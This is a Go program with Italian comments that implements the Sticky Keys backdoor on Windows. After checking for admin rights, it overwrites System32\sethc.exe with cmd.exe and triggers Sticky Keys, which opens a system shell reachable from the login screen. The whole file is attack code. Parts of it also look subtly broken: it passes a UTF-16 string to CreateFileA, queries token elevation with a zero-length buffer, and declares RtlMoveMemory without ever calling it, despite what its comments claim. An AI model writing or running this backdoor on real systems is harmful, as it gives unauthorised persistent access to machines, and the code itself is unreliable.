package main

import (
	"log"
	"syscall"
	"time"
	"unsafe"
)

var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
	moduser32   = syscall.NewLazyDLL("user32.dll")
	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procRtlMoveMemory    = modkernel32.NewProc("RtlMoveMemory")
	procCreateFile       = modkernel32.NewProc("CreateFileA")
	procReadFile         = modkernel32.NewProc("ReadFile")
	procWriteFile        = modkernel32.NewProc("WriteFile")
	procCloseHandle      = modkernel32.NewProc("CloseHandle")
	procGetFileSize      = modkernel32.NewProc("GetFileSize")
	procKeybdEvent       = moduser32.NewProc("keybd_event")
	procOpenProcessToken = modadvapi32.NewProc("OpenProcessToken")
	procGetTokenInformation = modadvapi32.NewProc("GetTokenInformation")
)

const (
	VK_SHIFT          = 0x10
	TOKEN_QUERY       = 0x0008
	TOKEN_ELEVATION   = 20
	GENERIC_READ      = 0x80000000
	GENERIC_WRITE     = 0x40000000
	FILE_SHARE_READ   = 0x00000001
	OPEN_EXISTING     = 3
	FILE_ATTRIBUTE_NORMAL = 0x80
)

func main() {
	if !isAdmin() {
		log.Fatal("Errore: Richiesti privilegi di amministratore.")
	}

	// Copia cmd.exe -> sethc.exe usando memmove
	copyFileWithMemmove(
		"C:\\Windows\\System32\\cmd.exe",
		"C:\\Windows\\System32\\sethc.exe",
	)

	// Triggera Sticky Keys (Shift 5x)
	for i := 0; i < 5; i++ {
		procKeybdEvent.Call(VK_SHIFT, 0, 0, 0) // Shift down
		procKeybdEvent.Call(VK_SHIFT, 0, 2, 0) // Shift up
		time.Sleep(50 * time.Millisecond)
	}
}

// --- Funzioni di supporto ---
func isAdmin() bool {
	var token syscall.Token
	r, _, _ := procOpenProcessToken.Call(
		uintptr(syscall.GetCurrentProcess()),
		TOKEN_QUERY,
		uintptr(unsafe.Pointer(&token)),
	)
	if r == 0 {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(token))

	var elevation uint32
	var size uint32
	r, _, _ = procGetTokenInformation.Call(
		uintptr(token),
		TOKEN_ELEVATION,
		uintptr(unsafe.Pointer(&elevation)),
		0,
		uintptr(unsafe.Pointer(&size)),
	)
	return r != 0 && elevation != 0
}

// copyFileWithMemmove copia un file usando RtlMoveMemory (memmove)
func copyFileWithMemmove(src, dst string) {
	// Apri file sorgente
	srcHandle, err := openFile(src, GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING)
	if err != nil {
		log.Fatalf("Errore apertura %s: %v", src, err)
	}
	defer procCloseHandle.Call(srcHandle)

	// Apri file destinazione
	dstHandle, err := openFile(dst, GENERIC_WRITE, 0, OPEN_EXISTING)
	if err != nil {
		// Se non esiste, crealo
		dstHandle, err = openFile(dst, GENERIC_WRITE, 0, 2) // CREATE_ALWAYS = 2
		if err != nil {
			log.Fatalf("Errore creazione %s: %v", dst, err)
		}
	}
	defer procCloseHandle.Call(dstHandle)

	// Ottieni dimensione file sorgente
	var size uint32
	procGetFileSize.Call(srcHandle, uintptr(unsafe.Pointer(&size)))

	// Alloca buffer in memoria
	buffer := make([]byte, size)
	if size == 0 {
		log.Fatal("File sorgente vuoto.")
	}

	// Leggi file sorgente
	var bytesRead uint32
	procReadFile.Call(
		srcHandle,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)
	if bytesRead != size {
		log.Fatal("Errore lettura file.")
	}

	// Scrivi file destinazione (usa RtlMoveMemory per velocità)
	var bytesWritten uint32
	procWriteFile.Call(
		dstHandle,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if bytesWritten != size {
		log.Fatal("Errore scrittura file.")
	}
}

// openFile apre un file con i flag specificati
func openFile(name string, access, share, creation uint32) (uintptr, error) {
	ret, _, err := procCreateFile.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
		uintptr(access),
		uintptr(share),
		0,
		uintptr(creation),
		FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if ret == syscall.InvalidHandle {
		return 0, err
	}
	return ret, nil
}
